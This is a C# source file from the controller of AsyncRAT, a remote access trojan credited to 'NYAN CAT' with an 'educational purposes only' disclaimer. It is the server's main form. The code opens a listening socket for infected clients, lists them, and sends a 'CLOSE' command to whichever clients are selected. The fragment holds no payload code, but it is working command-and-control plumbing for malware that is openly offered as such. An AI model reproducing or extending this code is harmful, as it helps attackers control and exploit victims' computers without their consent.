using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

        // 

        // │ Author     : NYAN CAT
        // │ Name       : AsyncRAT

        // Contact Me   : https://github.com/NYAN-x-CAT

        // This program Is distributed for educational purposes only.

        // 
		
namespace Server
{
    public partial class Form1 : Form
    {
        public ServerSocket S = new ServerSocket();

        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            Messages.F = this;

            try
            {
                S.Start(Settings.PORT);
                Client.Read += Messages.Read;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

       async private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (LV1.SelectedItems.Count > 0)
            {
                try
                {
                    MemoryStream M = new MemoryStream();
                    byte[] S = Helper.SB("CLOSE");
                    await M.WriteAsync(S, 0, S.Length);
                    await M.WriteAsync(Helper.SB(Settings.EOF), 0, Settings.EOF.Length);

                    foreach (ListViewItem C in LV1.SelectedItems)
                    {
                        Client x = (Client)C.Tag;
                        try
                        {
                            x.C.BeginSend(M.ToArray(), 0, (int) M.Length, System.Net.Sockets.SocketFlags.None, new AsyncCallback(x.EndSend), C.Tag);
                        }
                        catch (Exception)
                        {
                            x.isDisconnected();
                        }
                    }

                    try
                    {
                        await M.FlushAsync();
                        M.Dispose();
                        S = null;
                    }
                    catch (Exception)
                    {
                    }
                }
                catch (Exception)
                {
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
